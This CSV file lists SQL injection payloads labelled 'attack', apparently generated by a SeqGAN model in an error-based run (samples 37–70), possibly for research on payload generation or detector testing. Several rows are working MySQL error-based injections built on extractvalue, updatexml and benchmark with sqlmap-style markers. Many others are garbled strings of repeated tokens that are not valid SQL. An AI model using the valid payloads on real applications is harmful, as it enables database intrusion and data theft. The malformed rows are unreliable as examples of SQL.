label,payload,family,payload_type,method,run_id,sample_index
attack," AND 1 and extractvalue  (  (  3393,1   )    )    AND 2162  =  extractvalue  (  (  1297,1   (  )  (  select 0 from d5  4415  (  (  elt  (  1808  =  3393,  (  (  select   (  6200  )   (  (  (  case when   (  0 0 0 from ddual  )  )   end  (  (  el  elt  (  e  (  1297  =  (  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,37
attack,"1"" and extractvalue  (  (  (  7982,concat  (  (  =  (  (  (  (  0x2e,  (  =  (  (  3393,md5  =  (  (  1808,1   )    AND 'i'  )  select   (  1354  (  1  1 asut  elt 0 a  (  elt  elt  (  1808  =  (  0x4b774c75   or  (  (  3393  =  (  9836  5464  (  (  2917  =  (  (  0x5c,0x717a767a71   (  5000000(  (  7982  =  (  0x2e,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,38
attack," procea ddre analyse    (  3681  (  (  5000000  (  0x2e,0x7171706a71,  (  9788,1   (  )   (  9103  (  (  0x2e,0x7171706a71,  (  (  select   (  3393,  (  (  0x2e,concat  (  1808,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  3393,  (  5000000(  (  benchmark  (  case  =  (  0x2e,0x7171706a71,  (  select   (  elt    (  (  0x5c,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,39
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  'kbbl_nalyse  elt  (  elt  (  0x2e,1   )    (  extractvalue  (  (  0x2e,0x7171706a71,  (  (  5000000(  (  (  select   (  elt  (  1297  =  (  7982,1   )    ual_indjl  2446  )  #l_anaddronen asdute  elt  (  elt  (  7982  =  (  3393,  (  (  select   (  l  (  1 when   (  (  el  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,40
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""R$3933""  =  ""#",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,41
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,42
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,43
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,44
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,45
attack,"1%""   procedure anal  )  (  elt  el  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  e  (  0x5c,0x7171706a71,  (  select   (  elt  (  (  e  (  8862  =  (  3393,1    from  (  (  elt  )  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,46
attack,"ex  (  extractvalue  (  (  (  (  =  (  1297,m(  (  (  (  (  (  1808,  (  (  (  3393,concat  (  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x52515a50   )    (  (  (  5000000,md5  0x4b774c75   (  5847  (  (  select   (  el  (  0x2e,m(    (  select   (  )   (  =  3576  =  (  3393,0x717a767a71   (  (  6461  =  (  3393,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,47
attack,"AND and extractvalueU  (  2162  =  (  4688  )   or  (  (  1297  =  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  select   (  3539  =  4241  (  (  1808  =  (  3393,  (  select   (  elt  (  elt  (  0x5c,  (  benchmark  (  (  benchmark  (  5000000(  (  select   (  elt  (  elt  (  1808  =  2813  (  1049  =  (  (  1759  (  (  (  0x2e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,48
attack,"1%""   )    )     extractvalue  (  (   (  0 13545  =  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  4415  =  (  0x5c,md5  (  1808,1   (  extractvalue  (  (  9627,md5  (  0x5c,  (  5000000(  (  0x2e,0x7171706a71,  (  (  0x5c,md5  (  (  select   (  elt  (  elt  (  1759  =  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  t  (  5000000,md5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,49
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,50
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,51
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,52
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,53
attack,"1%""   #",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,54
attack,"1%""   )    AND 9338  =  9338  (  extractvalue  (  (  t  (  5000000(  (  3393,concat  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  1297  =  (  3393,1   from d5  (  elt  (  elt  (  3393  =  (  9627,md5  (  select   (  u 0 0 from d5 dual  )  )  )   end  (  (  elt  (  elt  elt  (  1297  =  (  select   (  u",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,55
attack,1%p cipni'  =  'kph,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,56
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ymwmnnmxp",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,57
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,58
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,59
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,60
attack,"1 where updatexml  (  (  (   SELECT du b  uanwhere when   (  1272  (  (  5000000,md5  (  1049  (  (  (  (  0x2e,  (  select   (  case 0 0 from dd an 0 from dua  el  )  elt  (  utl  (  e  l  1808  (  (  7636  .a  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  (  3393,md5  (  0x5c,0x717a767a71  (  select   (  ual  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,61
attack,"1% prend6804  =  ut  (  elt  (  7982  =  (  (  0x2e,0x7171706a71  (  select   (  elt  (  (  case when   (  6166  (  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  select   (  el  (  (  select   (  e  )   SELECT d an du 4415   (  1724  (  elt  (  2917  =  (  3393,  (  (  select   (  elt    (  0x5c,0x7171706a71,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,62
attack," AND 1 and updatexml  (  (  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  (  (  1759,concat  (  (  (  (  (  (  0x5c,  7982  (  (  5000000,md5  (  select   (  elt  (  elt  (  0x5c(  0x5c,0x7171706a71,  (  (  benchmarkt  (  5000000(  (  0x5c,0x7171706a71,  (  (  benchmark  (  benchmark  (  (  5000000,md5  (  (  0x2e,  (  0x2e,0x7171706a71,  (  (  select   (  e  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,63
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,64
attack,"1%""   (  )  case 0 or extractvalue  (  7982,concat  (  1759,0x7171706a71,  (  benchmark2914  (  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  5423  )   (  9103  (  (  3393,1   )    (  extractvalue  (  (  (  5000000,md5  (  (  0x2e,0x717a767a71   (  4774  (  (  case  =  (  1808,1   (  case when   (  (  elt  (  5000000,md5  (  0x2e,0x78  =  9393  (  (  9627,concat  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,65
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,66
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,67
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,68
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,69
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,70
